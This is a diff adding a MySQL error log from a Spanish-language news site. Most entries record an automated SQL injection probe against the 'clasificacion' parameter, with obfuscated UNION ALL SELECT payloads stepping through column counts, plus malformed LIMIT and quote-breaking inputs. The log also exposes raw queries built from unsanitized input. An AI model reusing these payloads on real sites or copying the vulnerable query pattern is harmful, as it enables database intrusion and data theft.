@@ -1,0 +1,491 @@
+Time : 23:54:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 23:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 23:25:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 18:11:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 11:50:43
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:43
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:42
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:42
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:41
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:41
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:40
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:40
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:39
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:39
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:38
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:38
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:37
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:37
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:36
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:36
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:35
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:35
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:33
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:33
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:31
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:31
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:30
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:29
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:28
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:27
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:26
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:25
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:25
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:24
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null,null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:23
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:23
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' /**//**/uNiOn/**/AlL /**//**/sElEcT null and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=1' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'0=1' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:50:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:50:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:49
